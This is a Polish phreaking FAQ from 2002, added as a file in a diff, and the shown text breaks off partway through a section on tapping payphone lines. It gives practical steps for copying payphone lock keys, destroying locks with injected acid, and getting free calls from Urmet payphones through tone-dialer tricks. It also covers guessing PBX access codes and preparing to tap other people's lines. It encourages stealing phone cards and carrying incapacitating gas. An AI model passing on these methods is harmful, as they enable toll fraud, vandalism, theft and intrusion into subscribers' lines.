@@ -1,0 +1,1377 @@
+  ∞∞∞∞∞∞∞∞∞∞∞∞∞∞±±±±±±±±±±≤≤≤≤≤≤≤≤€€€€€€€€≤≤≤≤≤≤≤≤±±±±±±±±±±∞∞∞∞∞∞∞∞∞∞∞∞∞∞
+                       [Lord.GRAND - PHREAK FAQ V 2.2u]
+                       [naklad: 5000000001 egzemplarzy]
+                          [oficjalny sponsor TP S.A]
++--------------------------------------------------------------------------+
+| ∞*∞∞±€∞∞∞*∞∞∞∞∞∞∞∞∞*∞∞±€€€€€€€€∞∞∞∞∞∞*∞∞∞∞∞∞∞∞±€€∞∞∞∞∞∞*∞∞∞∞∞∞∞∞∞∞∞∞∞*∞∞ |
+| ∞±€€€€∞∞∞∞∞∞∞∞∞∞*∞∞∞∞∞±€€∞∞∞€€€±€€€€€€€€∞±€€€€€€€€€€€€∞∞±€€€±€€€€€€∞∞∞∞∞ |
+∞∞∞±€±€€∞∞*∞∞∞∞*∞∞∞∞∞∞∞∞±€€∞∞∞±€€∞±€€∞∞±€€€±€€∞∞±€€±€€±€€∞±€€€±€€∞±€€€€∞∞∞∞∞
+| ∞∞∞±€€∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞±€€∞∞±€€€∞±€€∞∞±€€€∞∞∞∞∞±€€±€€±€€∞±€€€±€€∞∞∞±€€€€∞ |
+| ∞∞∞±€€∞*∞∞∞∞∞∞∞∞∞*∞∞∞∞±€€∞∞±€€€∞±€€€€€€€€∞∞*∞∞±€€±€€∞±€€∞±€€±€€∞∞∞∞∞±€€∞ |
+| *∞±€€€∞∞∞∞∞*∞∞∞∞∞∞∞∞∞∞±€€∞∞∞∞∞∞∞±€€±€€∞∞∞∞∞∞∞∞±€€±€€∞±€€∞±€€±€€€∞∞∞∞±€€∞ |
+| ∞∞±€€€∞∞∞∞∞∞∞∞*∞∞∞*∞∞±€€€∞∞∞∞∞∞±€€€±€€€∞∞*∞±€€€€€±€€∞∞±€€±€€±€€€∞∞±€€€€∞ |
+| ∞∞±€€€∞∞∞*∞∞∞∞±€€€€€€±€€€±€€€€€±€€€∞±€€±€€±€€∞±€€∞∞∞∞∞±€€±€€±€€€±€€€€∞∞∞ |
+| ∞∞±€€€∞∞∞∞∞±€€±€€∞±€€±€€€∞∞∞±€€±€€€∞±€€€€€∞±€€€€€€∞∞*∞∞±€€€€±€€€€€€∞∞∞∞* |
+| ±€€€€€€€€€€±€€±€€∞±€€±€€€€€€±€€∞∞*∞∞∞∞∞∞∞∞*∞∞∞∞∞∞∞*∞∞∞∞∞∞∞∞∞∞∞∞*∞∞∞∞∞∞∞∞ |
+∞∞±€€€€€€€€€€€€€±€€€€€€±€€€€€€€€€∞∞∞[last update:25.02.2002]∞∞∞∞∞∞∞∞∞∞∞*∞∞∞∞
+| ±€*∞∞∞∞∞∞∞∞∞*∞∞∞∞*∞∞∞∞∞∞∞*∞∞∞∞*[(c)Copyright 2001/`02 by Lord.GRAND]∞∞∞∞ |
+| ∞∞∞∞∞∞*∞∞∞∞∞∞∞∞∞∞∞∞*∞∞∞∞∞∞∞∞∞*∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞*∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞*∞∞∞ |
++--------------------------------------------------------------------------+
+                         [grandmaster@poczta.onet.pl]
+                        [HTTP://WWW.GRANDMASTER.HG.PL]
+                                       or
+                         [HTTP://WWW.LORD-GRAND.DA.RU]
+                           [HTTP://PHREAKING.AT/LORD]
+  ∞∞∞∞∞∞∞∞∞∞∞∞∞∞±±±±±±±±±±≤≤≤≤≤≤≤≤€€€€€€€€≤≤≤≤≤≤≤≤±±±±±±±±±±∞∞∞∞∞∞∞∞∞∞∞∞∞∞
+<--  --- ---- --------------------------------------------------------------+
+N - nowe                                                                    |
+U - uaktualnione                                                            |
+                                                                            |
+  mEnu:                                                              InFo:  |
+^^^^^^^^^                                                          ^^^^^^^^ |
+1.------wstep (przeczytaj.to.koniecznie)                                  >U<
+..1.1-----Info`z dla 'nowiciuszy' (jak jestes w temacie -> pomin)           |
+..1.2-----Info dla lamerÛw...                                               |
+2.------Potrzebny sprzet:                                                   |
+..2.1-----Klucz (jak go dorobic samemu?:)                                   |
+..2.2-----"PhReAk0-phone" (jak go zrobic?)                                >U<
+..2.3-----Karta(y) Programming (po co? :))))                                |
+..2.4-----Teorja czyli TXT :)                                               |
+..2.5-----Inne bardzo potrzebne rzeczy...                                   |
+..2.6-----Gadgety dla 'zawodowcow'...(lamy maja zakaz czytania:)            |
+3.------pHreAk w pOlskIm wyKon4niU (bugi;)  >>PRAKTYKA<<                    |
+..3.1-----Stare nedzne sposoby                                              |
+....3.1.1---lycha                                                [zetonowiec]
+....3.1.2---kopniak                                              [zetonowiec]
+....3.1.3---rozmowa przychodzaca                                 [blue Urmet]
+....3.1.4---"lamerska bajka 1"                                   [blue Urmet]
+....3.1.5---"lamerska bajka 2"                                   [blue Urmet]
+..3.2-----Nowszy, lepszy sposoby                                            |
+....3.2.1---"wewnetrzne" centrale                                     [PBX`y]
+....3.2.2---"4cyferki"                                           [blue Urmet]
+..3.3-----Najskuteczniejszy sposob... podpinka pod urmet`a                  |
+....3.3.1---Przygotowanie Niebieskiego                                      |
+....3.3.2---Przygotowanie Srebrnego                                         |
+....3.3.3---"Podpinka Wlasciwa" - dzwon gdzie chcesz :)          [podpinanie]
+..3.4-----Podpinka w bloku                                       [podpinanie]
+..3.5-----Nowy BUG na Jajco i Srebrnego.                     [Jajo/Silver]>N<
+4.------Kopiarka kart magnetycznych (jedno-bebnowa)                       >U<
+..4.1-----Co bedzie potrzebne, i jak to zdobyc?                             |
+..4.2-----Jak to zlozyc wszystko do 'kupy'?                                 |
+..4.3-----Instrukcja obslugi tego co zbudowales...:)                        |
+5.------Trochu o Niebieskim URMECIE...                                      |
+..5.1-----Budowa anatomiczna                                                |
+....5.1.1---Zabezpieczenia mechaniczne:)                                    |
+..5.2-----Budowa morfologiczna :)                                           |
+....5.2.1---Epprom - fajna "zabawka" :)                                     |
+....5.2.2---Inne ciekawe rzeczy...                                          |
+6.------Centrale telefoniczne.                                              |
+..6.1-----Uslugi dodatkowe na centralach cyfrowych                          |
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
+-   =   -   =   - N = O - T =   - P = h - r = e - a = k -   =   -   =   -
+7.------Hacking (to co prawda nie phreak ale zawsze UNDERGROUND:)
+..7.1-----Info dla lam
+..7.2-----Bug`i na zdobycie pliku "PASSWD"...
+..7.3-----Co zrobic z plikiem PASSWD?(g≥upie pytanie:)
+8.------Bios HACKING (raczej cracking)
+..8.1-----Hasla uniwersalne do biosu Award i Ami
+-   =   -   =   -   =   -   =   -   =   -   =   -   =   -   =   -   =   -
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|
+9.------Inne (ciekawostki/pomysly/spostrzezenia etc)...                     |
+..9.1-----Nabijanie sie z ludzi przez telefon                               |
+..9.2-----Jak zrobic "przejÍcie" karty?                                     |
+....9.2.1---Sposob 1                                                        |
+....9.2.2---Sposob 2                                                        |
+....9.2.3---Sposob by Lord.GRAND (100%niezawodny)                           |
+....9.2.4---"CUKIEREK" by Lord.GRAND (troszke wiejski;))) nie polecam!    >U<
+..9.3-----Zabawa z Blurmet`em...                                            |
+..9.4-----Polowanie na URMET`a :))                                          |
+..9.5-----Oznaczenia okregow by TP S.A.                                     |
+..9.6-----Ciekawa rozmowa z ...                                             |
+..9.7-----TP S.A. online :))                                                |
+..9.8-----Jak inni leca w preta!!!                                        >N<
+..9.9-----Troche o uslugach dodatkowych                                   >N<
+10.-----Zabawy z Epprom`em z niebieskiego:)                                 |
+..10.1----Co to pudlo do cholery gada?                                      |
+11.-----Karty chip`owe...                                                 >U<
+12.-----pHreAk "SZOP" - co? gdzie? kupic                                  >U<
+13.-----najnowsze FAQ                                                     >U<
+14.-----Gre3tZ...                                                           |
+15.-----THE END OF "Lord.GRAND pHre4k FAQ"                                  |
+16.-----Contact with Me...                                                >U<
+                                                                            |
+>--    --   ----  ----------- ----------------------------------------------+
+_____________________________________________________________________________
+€≤≤±±∞∞∞1.Na wstepie kilka swietych i niezbednych slow: "Wszystko tytaj zapi-
+sane sluzy celom edukacyjnym a autor tekstu nie ponosi zadnej odpowiedzialno-
+sci za szkody powstale po przeczytaniu textu oraz za wykorzystanie materjalow
+tu  zawartych  do  niecnych  i  niezgodnych z Polskim prawem celow." za razem
+zastrzegam ze ponizszy  text  moze  byc  rozprowadzany  w ilosciach b.duzych,
+mozesz ten text zamiescic na swojej stronie WWW etc tylko jest jedno ale: nie
+wprowadzajcie zadnych zmian  w  tekscie ani  nie  pobierajcie keszu za to FAQ
+(no  chyba  ze  dla  jakiegos  tempego  lamera :)  Text ten jest  od  podstaw
+napisany  przezemnie i niczego nie RIPUJE...  Sposoby przedstawione w tym FAQ
+zostaly sprawdzone  i dzialaja (a niektore "dzialaly":).  Nowa (uaktualniona)
+wersja tego  FAQ  bedzie zawsze  dostepna na:  .::Lord.GRAND::. - pHre4k pAg3
+[http://www.grandmaster.hg.pl/]. To wszystko na wstep. Milej lektury... Aha i
+jeszcze  jedna  sprawa, FAQ  najlepiej  czytac pod "czystym" DOS`em lub w np.
+Notatniku z czcionka "TERMILAL" i rozmiarem 12. To samo sie tyczy pliku *.nfo
+dodanego do FAQ. Dla lamerow pragne wytlumaczyc  te uwage  tym  ze  czcionka:
+"TERMINAL" jak i domyslna czcionka DOS`a wyswietlaja "grafike" ASCII :)))
+
+Teraz moze troche o FAQ:  jest  pisane, uaktualniane i edytowane na bierzaco,
+oczywiscie  tylko  przeze  MNIE!!.  Data  ostatniej  aktualizacji FAQ  jest w
+naglowku FAQ (for lammers: prawy golny rog LOGO;). A co do FAQ  to  musze cos
+przypomniec i... oznajmic. FAQ jest  Tekstem edukacyjnym ;), podobnie jak np:
+"ksiazka do Chemi dla kandydatow na wyzsze uczelnie" itd. ;))) Czesc FAQ jest
+naprawde  napisana  w  celach  edukacyjnych (np.9.2.1/2/3/4) gdzie opisane sa
+rorznego rodzaju rzeczy przedstawione tylko  i  wylacznie by pokazac  ze  cos
+takiego istnieje i jest mozliwe. No i to chyba wszystko.
+
+
+€≤≤±±∞∞∞1.1.Info  dla  poczatkujacych!   Wazne: Jesli postanowisz zostac REAL
+phreaker`em  to  pamietaj  o kilku bardzo waznych zasadach (nie do zlamania):
+.   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .
+-dzialaj w nocy (wieczorem) lub na cholernych zadupiach...
+-nikomu z poza 'branzy' nie pokazuj gadgetow (kluczy etc...)
+-nie szpanuj akcesorjami i wiedza przed jakimis panienkami czy kolesiami
+-staraj sie robic jak >najmniejszy< przypa≥
+-nie niszcz automatu publicznego gdy jest np.: ONLY 1 na wiosce...
+-nie podpinaj siÍ pod kabel ludzi biednych co nawet na chleb nie majπ
+-staraj sie nie okradac (z kart) zbyt czesto zwyklych ludzi
+-podpinaj sie najczesciej do bogatych beduinÛw co srajπ kasa...
+-nie dzialaj na pokaz...
+-podpinaj siÍ tylko radio-telefonem ('baza' u ofiary, sluchawka u ciebie)
+-nigdy nie porzyczaj sprzetu lamerom
+-nigdy nie rozmawiaj o phreak`u z lamerami
+-czytaj duzo tekstow o tej tematyce
+-sprawdzaj najnowsze bugi w swoim miescie...
+-jesli cos kiedys odkryjesz to pusc to 'w sieÊ'
+-jak juz bedziesz wystarczajaco duzo wiedzial to przekaz wiedze innym...
+-nigdy nie  badz nadgorliwy i nie chodz w to samo miejsce kilka razy na akcje
+-nigdy  ale to nigdy nie daj sie ZLAPAC...! Chyba ze wolisz 3lata w zawiasach
+.   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .
+
+
+€≤≤±±∞∞∞1.2.Info  dla  lamerÛw.  Uwaga  to bardzo wazna sprawa... A wiec tak:
+"Jesli  do  jutra na moje  konto w Rosji n ie wp≥ynie 10$ to wasz chomik moze
+juz do was nigdy nie wruciÊ...:))" A tak na serio to ostatnio coú mnie bardzo
+zaniepokoilo...  otoz  wchodze  sobie na  #phreakpl a  tam 1bot i 3lamerow :0
+Kurwa  co  sie  dzieje?  pomyslalem...        Do jednego  kolesia  napisalem:
+-=- -=- -=- -=-
+(ja)=witka
+(koles)-no cze
+=jestes z branrzy?
+-no
+=jakiej?
+-jestem phrejkerem
+=serjo?
+-na prawde
+=to dobrze sie sklada
+-dlaczego?
+=bo mam maly problem:(
+-jaki
+=powiedz mi: co to jest teletaksa?
+...
+...
+(chyba 1 minuta przerwy ???)
+...
+...
+-to jest takie cos w centrali, ze nie mozesz dzwonic za darmo
+=serjo, bo ja ostatnio zalozylem sobie RedBoxa w chacie i nie chce mnie
+polaczyc a  mam cyfrowπ centrale, to moze byc ta teletaksa?
+-napewno masz teletakse na centrali, to dlatego... 
+-=- -=- -=- -=-
+
+Takich  bzdur jak od tamtego lamera to naprawde bardzo dawno  nie  slyszalem.
+Ten koles z ktorym gadalem ma nick`a: pHox3. Do IRC`owania uøywam mIRCa i jak
+z  tym kolesiem  gadalem  to niemoglem sie powstrzymac i strzelilem SCREEN`a,
+moze  go  zamieszcze  na  stronce:)  Normalnie  nie  wiem jak mozna byc takim
+lamer`em  i  nie  wiedziec co to jest teletaksa:)  A  co dopiero ≥yknac kit z
+RedBox`em na centrali cyfrowej.
+
+-----------------------------------------------------------------------------
+
+€≤≤±±∞∞∞2.Co do  sprzetu to  chyba nie  trzeba duzo  wyjasniac? Do niektorych
+zawodow  potrzebne sa rozne rzeczy.  Np.: dla informatyka ->komputer no a dla
+mechanika ->klucze. Tak samo  jest w PHREAK`ingu :) Aby byc dobrym phreakerem
+(oprucz  wiedzy i inteligencii) potrzeba  odpowiedniego  sprzetu.  Oczywiscie
+zalezy co Phreaker lubi robic...  Jak bardzo lubi grzebac w  budkach, skrzyn-
+kach  etc. to potrzebuje:  lutownice , cyne , klucze (AbloY`e) ,  kable  itp.
+
+€≤≤±±∞∞∞2.1.Klucz.  Automaty publiczne TP (sux)  maja zabezpieczenie mechani-
+czne, krore nie  pozwalaja otworzyc automatu.  Jednym i  najbardziej istotnym
+jest  zamek firmy  ABLOY (made in Finland - taka ciekawostka). Jak wiecie aby
+otworzyc zamek (obojetnie jaki)  potrzebny jest klucz.  Nie koniecznie trzeba
+go kupywac , mozna go zrobic samemu.  Otorz Hrabia wymyslil  cos  takiego jak
+liczbowy  kod klucza.  Np.: do niebieskiego automatu, klucz ma kod >00013100.
+Narazie  wszystko jasne.  Liczba 1 to wciecie o glebokosci ok.1mm.  No a 3 to
+3*1=3mm :)  Takwiec  przejdzmy do  dorabiania klucza.  Klucz abloya  do budek
+(przewaznie)  ma  przekroj litery D.  Wiec  potrzebujemy  jakiegos  wzorca, z
+ktorego  zrobimy  klucz.  Najlepiej kupic "sorowke" - czyli klucz bez zadnych
+wciec ("czysty") u dorabiacza mozesz kupic za ok.5-7zl.  Teraz masz juz klucz
+ale  musisz  go dopasowac do  zamka tak  aby go otworzyl.  Potrzebujesz zamek
+(ja moge sprzedac zamek 00013100 za 15zl)  w  tym  celu musisz zajebac budke.
+Jak juz  masz zamek to odkrecasz  taka  mala  srubke (chyba 6 lub 8), jak nie
+chce  isc to moze jest tam taka blaszka z zabkami zagietymi do gory, jek jest
+to  te  blaszki odegnij  na  dol (3 lub 4-zabki).  Teraz musisz  wysunac taka
+chuda , miedziana podkladke - zrob to  najlepiej  jakims  cyrklem etc.  Teraz
+obruc  zamek  dziura do  gory i delikatnie  zdejmij te srebrna obudowe. Zoba-
+czysz taki "lejek" :) i  w min 9 przecowek  (w tym jedna srebrna)  kilka cie-
+kich  podkladek (chyba 8) i  bolec o przekroju  ok.1mm. Teraz  wkladasz klucz
+i  patrzysz  jak sie  ustawiaja luki (na spodzie zamka),  jak  wkladasz dobry
+klucz to luki ustawia sie w jednej lini -------- a jak wsadzisz "czysty klucz
+to bedzie cos takiego ---ÄÄÄ-- wiec latwo skapowac ze trzeba zrobic 3 wciecia
+aby te ÄÄÄ zamianilo sie w --- czyz nie?  Teraz tylko bierzesz pilniki i bie-
+rzesz sie do roboty.  Szlifujesz do momentu az  powstanie szpara na polec. To
+napewno troche potrwa wiec wczesniej zrob sobie cos do zarcia i picia:) No to
+pozostaje zyczyc milej zabawy z ABLOY`em :)
+Dobry klucz powinien wygladac mniejwiecej tak:   (nie sugeruj sie rozmiarem:)
+<...--------------------------------+              +--------------------+
+<...                                |              |                    |\
+<...                                +----+    +----+                    | \
+<...                                     |    |                         |  \ 
+<...                                     |    |                         |   |
+<...                                     |    |                         |   |
+<...                                     +----+                         |   |
+<...                                                                    |   |
+<...                                                                    |  /
+<...                                                                    | /
+<...                                                                    |/
+<...-------------------------------------------------(c)by-L.Grand------+
+
+
+€≤≤±±∞∞∞2.2."Phreak  phone" - czyli telefonik do phreaku. Jak go zrobic? Otoz
+idziesz na jakis kiermasz , rynek lub bazar i kupujesz najtanszy telefon jaki
+spotkasz :)  Uwaga: najlepiej jek ma do  wyboru: wybieranie tonowe i pulsowe.
+Teraz  w  sklepie z elektronika kupujesz jekies pudelko ktore nie "przyciaga"
+wzroku natretnych lamerow:) Teraz z telefonu wyciagasz plytke z elektronika i
+wkladasz  do  pudelka.  Idziesz do  sklepu  i kupujesz: dwa "krokodylki", dwa
+dzeki (stereo) i dwa gniazdka dzek`ow (stereo). Teraz w miejsce kabla od mik-
+rofonu montujesz jedno gniazdko, a grugie w miejsce sluchawki. Kupujesz sobie
+"papuge" (sluchawko-mikrofon -> jak w komputerze:)  lub robisz ja samemu:) im
+mniejsza tym lepsza:) .Teraz robisz sobie gniazdko do wpinania sie: w miejsce
+podlaczenia do sieci  montujesz kabelki z krokodulkami na koncu. Teraz ladnie
+montujesz  klawiatorke (1,2,3,4,5,6,7,8,9,0,*,#)  i to wszystko.   Masz super
+telefonik :) Jak np. ten na rys1. HiHi...  Jesli natomiast  nie masz checi na
+wlasnoreczne skladanie to polecam ci sie wybrac do sklepu z telefonami (tylko
+w niektorych SA) i kupic taki maly telefonik. O ile sie nie myle "Genius mini
+phone `99" czy jakos tak ;)) Na phreak.zone.to sa takie ale nie daj sie robic
+na jelenia oni chca za 100PLN a  w sklepie  u mnie kosztuje od 40PLN do 50...
+(piszac phreak.zone.to mam na mysli  tylko adres, Hrabia jest spoko i pozatym
+nie odpowiada za to co sie dzieje  w dziale sklep) Z reszta rob jak chcesz...
+Przeczytaj jeszcze [9.8]!!!!
+
+              +----------------+
+              |                |
+              |  |1||2||3|     D <- gniazdko na "papuge"
+              |  |4||5||6|     |
+              |  |7||8||9|     |_ <- przelacznik tony/pulsy
+              |  |*||0||#|     |
+              | ______         |
+              ||REDIAL|        |                      \/
+              +-----__---------+                      |     <-"krokodylki"
+rys1                ||                                | \/      (linia)
+(c)2001 by          |+--------------------------------+ |
+Lord.GRAND          +-----------------------------------+
+
+
+€≤≤±±∞∞∞2.3.Po co jest karta  programming to chyba kazdy (wtajemniczony) wie.
+Karte programming mozna kupic za 50-150zl wraz z numerem. Sa rozne karty pro-
+gramming. Karta ktora daje najwiecej nozliwosci i co za tym idzie korzysci to
+oczywiscie: "PROGRAMMING". Karte wkladasz do bebna, ona na chwile tam zostaje
+i  zaraz wylatuje.  Pokazuje sie menu (hrabia je opisal w swoim FAQ) tam masz
+rozne funkcje: numery darmowe, num.zablokowane, taryfikacja, co ile ma znikac
+impuls, numer  do  centrali, liczba  polaczen  wychodzacych, przychodzacych i
+inne, rozne ciekawe zeczy...
+
+€≤≤±±∞∞∞2.4.Texty czyli teorja  to  wieksza czesc sukcesu:) Jak juz bedziecie
+wprawieni i zaanwasowani  to  zaczniecie pisac wlasne FAQ, wtedy bedzie mozna
+powiedziec o sobie "Phreaker".  Texty edukacyjne mozna znalesc na #phreakpl i
+na   stronach   WWW: www.lord-grand.da.ru-phreak.zone.to-www.phreak2000.hg.pl
+www.underground.org.pl-www.phreak.it-etc.Przeczytac to nie wszystko... trzeba
+jeszcze miec trochu checi i zdolnosci...(nie mozna byc lamerem:)H^h^h...
+
+€≤≤±±∞∞∞2.5.Inne  bardzo potrzebne rzeczy... - tu mam na mysli: lomy, sztosy,
+mlotki, srubokrety, brzeszczoty, flex`y, kwasy, pilniki, wiertarki, trotyl  i
+tym podobne:)Wedlug mnie,najbardziej cichym i najlatwiejszym (bezprzypalowym)
+sposobem  "wiecznego"  otworzenia URMET`a  jest  wstrzykniecie kwasu (HCl lub
+H2SO4) do zamka przez odpowiedni do tego przyzad (szczykawe):
++---------------------------------------------------------------------------+
+|                                         (patrz bokiem)                    |
+|                 |                                                         |
+|                _|                                                         |
+|               / |```````+   <--------zamek abloy                          |
+|       +-------|--------ÄÄÄ>                                               |
+|       | <--+  \_|,,,,,,,+                                                 |
+|     _||_   |    |                                                         |
+|    |    |  |    |<-------------------obudowa urmeta                       |
+|    |HCl |  |                                                              |
+|    |____|  +-------------------------zgiety wÍzyk (o)=1-1,5mm             |
+|    | || |                                                                 |
+|    | || |                                                                 |
+|   ========                                                                |
+|      ||           (c)2001 by Lord.GRAND                                   |
+|      ||           www.grandmaster.hg.pl                                   |
+|     ----                                                                  |
++---------------------------------------------------------------------------+
+Jezeli  nie  macie  kwasu  solnego, ani siarkowego i niemozecie ich zajebac z
+gabinetu chemicznego w szkole:)  To mozecie  uzyc  silnego  roztworu chlorku-
+zelaza FeCl - 250g tego specyfiku mozna kupic za 6-11zl. Jest tylko jedno ale
+,trwanie wypalania bedzie ok. 20 razy dluzsze. Ale trudno:)
+
+€≤≤±±∞∞∞2.6.Gadgety dla zawodowcow - czyli  dla phreakerow-elektronikow:) Mam
+konkretnie  na  mysli  programatory  eprom`ow.  To taka mala plytka ktora sie
+podlacza  do  komputera  przez  port od drukarki (LPT:). Dzieki niej mozna na
+wyjenty z URMET`a eprom wrzucic cos fajnego... np.: inne texty, teryfikacje:)
+
+-----------------------------------------------------------------------------
+
+€≤≤±±∞∞∞3.Phreak w polskim wykonaniu. Ta sprawa chyba  nie wymaga komentarza,
+bo nie zadko sie  widzi dzieci (i lam`y) ktore w  celu np.: pozyskania karty,
+wkladaja jakies  papierki i zapalki  do bebna  automatu.  To troche zalosne:(
+
+€≤≤±±∞∞∞3.1.Stare  nedzne sposoby.  Czyli jakie "sztuczki" kiedys krolowaly w
+Polskim phreaku  kilka lat  temu, oraz  jakie tricki  sa  kompletna, zasrana,
+lamerska bzdura...
+
+€≤≤±±∞∞∞3.1.1.Ten trick  byl  juz  chyba znany w  epoce kanienia lupanego, to
+znaczy: jak panowaly zetonowce :).  Sposob polega na  tym ze wklada sie lyzke
+(dlatego taka nazwa:) lub  widelec , do otwora zetonowca  kiedy chce zetona i
+sie grzebie ta lycha az mu sie odechce zetona. Sposob bardzo prymitywny bo co
+okolo 3 minuty musisz wkladac lyche. Uwaga: lyzke nalezy wkladac do otwora ta
+cienszom stronom :)
+
+€≤≤±±∞∞∞3.1.2.Kopniak. Nazwa mowi sama za siebie. Dziala tylko na zetonowcach
+na jakichs zadupiach:). Poprostu podnosisz sluchawke i jak automat kce zeton,
+to robisz kopniaka w automat i juz powinno mu sie odechciec zetonow:). Jak po
+jakichs 5 kopach nadal chce zetona  to znaczy ze ten "pseudo" bug, nie dziala
+na  tym  automacie. Sposob dziala  na tej samej podstawie co 3.1.1. czyli jak
+kopiesz  w automat to czujnik 'mysli' ze wrzucono zeton:) Nie zadze praktyko-
+wac tego sposobu na dworcach, w metrze i innych miejscach publicznych.
+
+€≤≤±±∞∞∞3.1.3.To bardzo fajny BUG. Aby sobie cos takiego zrobic potrzebujesz:
+butki telefonicznej typu URMET  w  kolorze  niebieskim, centrale rozpoznajaca
+tony, telefon komorkowy, oraz ToneDialer lub dyktafon... Zaczynamy. Jesli nie
+masz toneDialer`a tylko dyktafon to  podnosisz s≥uchawkÍ przyk≥adasz dyktafon
+do  s≥uchawki  i  wybierasz  numer  pod  jaki  bedziesz  dzwonil, wszystko to
+nagrywasz  i  pamietaj ze jakosc nagrania zadecyduje  o tym czy ci sie uda...
+Takwiec wszystko mamy gotowe idziemy  na zadupie pod jakas fajna budke. Teraz
+wez tel. komorkowy  i wykrec numer na budke (num. zazwyczaj jest na obudowie)
+lub  w  ksiazce telefonicznej...  Budka zaczyna dzwonic, zrywasz polπczenie w
+telefonie komorkowym, i 1-2sekundy  potym  odbierasz sluchawke w budce. Budka
+na  wyswietlaczu masz: "ROZM.PRZYCH." a w sluchawce  slychac DialTone i takie
+dziwne  pikanie ("pik - pok") w  tle...  Przykladasz  ToneDialer`a i wybijasz
+numer... s≥ychaÊ  ze  cie lπczy... i jestes!!!:) Jeúli  masz  dyktafon to nic
+prostrzego... przyk≥adasz dyktafon  i wciskasz PLAY...:) Jesli masz Teletax`e
+zamontowanπ to po 3 minutach stracisz polπczenie:(
+
+€≤≤±±∞∞∞3.1.4.Lamerski bajeczki  to prawdziwa plaga... Nawet idac sobie ulicπ
+mozesz stac  sie ofiara niepoczytalnie niedorozwinietego lamera. Pewnie kazdy
+z  was  slyszal  kiedys przynajmniej jedna lamerska bajke... Na poczatek chce
+zaznaczyc  ze  ten  "kawalek" FAQ  nie  sluzy do edukacji tylko uswiadomieniu
+lamerπ  ze sπ tacy tempi... No dobra pierwsza bajka mowi o tym ze jesli karte
+potrzymamy chwile nad swieczka  to  bedzie miala przez chwile 100 impulsow :)
+To chyba wymysli≥ ten najbardziej uposledzony lamer... :)
+
+€≤≤±±∞∞∞3.1.5.Zaú druga  lamerska  bajka   opowiada  jeszcze  bardziej dziwnπ
+historie.  Takwiec uwaga: "karta ktora  sie owinie tasmπ klejπcπ bedzie karta
+ktorej sie nie skasuje...  Bedzie miala wieczny impuls...(!)" - takie glupoty
+to naprawde... wspolczuje autorowi takiej glupoty...
+
+€≤≤±±∞∞∞3.2.Nowszy lepszy sposob?    Tradycyjne sposoby polegajπ zazwyczaj na
+grzebaniu siÍ we wnetrzu budki itd.  Tutaj tak nie bedzie. Glownym narzedziem
+bedzie toneDialer...
+
+€≤≤±±∞∞∞3.2.1.Wewnetzne centrale inaczej PBX.Sa zazwyczaj montowane w jakichs
+instytucjach  panstwowych,  urzedach  etc.  PBX ma zazwyczaj  "wyjscie" czyli
+mozliwosc  zadzwonienia  Z NIEGO   na  miasto :)  Ale jak wiadomo aby uzyskac
+polaczenie trzeba  podawac  zazwyczaj haslo (4 do wiecej cyfr w zaleznosci od
+PBX`a).  Najlepiej  jesli PBX jest na lini 0800:) Nozna sobie zazucic program
+np: "BlueBeep" - (dostepny  na  mojej stronie w dziale progs) ktory ma mozli-
+wosc lamania PBX`ow...  Znam  tez ludzi co  sprzedaja numery wraz z kodami do
+central wewnecznych... ale po co placic? Samemu  mozna pokombinowac:))) prze-
+waznie kod to 1111 lub 1234,naprawde. U mnie, tzn. w moim miescie, w Urzedzie
+Celnym jest fajna centralka... ale jeszcze jej nie rozgryzlem :(
+
+€≤≤±±∞∞∞3.2.2."4cyferki" to w moich okolicach dosc nowy sposob. Moze najpierw
+GO opisze: co potrzebne? tylko ToneDialer no i oczywiscie URMET typu TSP 91 -
+czyli poprostu niezawodne :) niebieskie pud≥o. Wykonanie? Podchodzisz do blue
+URMET`a i podnosisz sluchawke. Wybierasz numer 999 i puszczasz na mikrofon  9
+z ToneDialer`a, wciskasz # a nastepnie REDIAL (okragly guziczek kolo widelek)
+ale  caly  czas trzymasz  9  na ToneDialerze. Jeúli BUG  ten zadziala≥ to nie
+powinno cie ≥aczyc... Poniewarz centrala >CZTERY< takie same tony uznaje jako
+jeden :) ale oczywiscie nie kazda centrala jest taka sama...  Czyli jak wiesz
+bugiem  mozesz  dzwonic tylko  pod numery zaczynajace sie  od 9 :( ale mozesz
+sprobowac "zresetowac"  po≥aczenie  ToneDialerem, ale szczerze mowiac to masz
+2% szansy ze ci sie uda, choc to zalezy :))))
+
+€≤≤±±∞∞∞3.3. Przepuszczam ze nikomu nie trzeba mowic co to jest podpinka :)))
+a co dopiero podpinka pod urmet`a... Takwiec wedlug mnie jest to  jedyny i na
+100%: najskuteczniejszy sposob na dzwonienie  za  Friko.  Jest kilka zastoso-
+wan  tego sposobu, ale opisze jeden reszty  sie domyslicie. Aby sie pobawic w
+te  "klocki" potrzebujesz: ToneDial`er, Phreak`o-Phone, klucz Abloy 00131000.
+Jesli  nie  masz  doswiadczenia  to uwaznie przeczytaj [3.3.1] i [3.3.2] bo w
+przeciwnym razie zabawa moze sie zkonczyc nieciekawie ;((
+
+€≤≤±±∞∞∞3.3.1.Tak  wiec  aby sie podpiac pod niebieszczaka musisz odpowiednio
+sie do tego  przygotowac. Polecam podpinanie sie puzno w nocy lub wieczorem w
+zimie :)))  oczywiscie  na jakims zadupiu :))). Jesli jestes amatorem jeszcze
+to wez  ze soba  jakis gaz  obezwladniajacy lub cos... tylko nie gnata :))) A
+jesli juz masz jakies doswiadczenie (lub tak myslisz:) to i tak musisz wziasc
+wyposarzenie  obowiazkowe.  Czyli ok.15m kabla 2-u zylowego (czarnego) z kro-
+kodylkami na  koncu, przecinak  do drutu  lub kombinereczki (male), moze  byc
+takie cos do obcinania paznokci. Moze sie przydac takze izolacja. No zakladam
+ze wszystko jest :) Idziemy  sobie wieczorem na jakies fajne zadupie gdzie to
+wlasnie  stoi  nasz upatrzony cel. Teraz  Niebieszczaka tylko przygotujemy na
+nasze powtÛrne  przyjscie :)).   Otwieramy  Urmet`a i szybko wyciagamy plytke
+podlaczonπ do lini  z plyty glownej... juz.  Teraz popatrz na lewo, na boczna
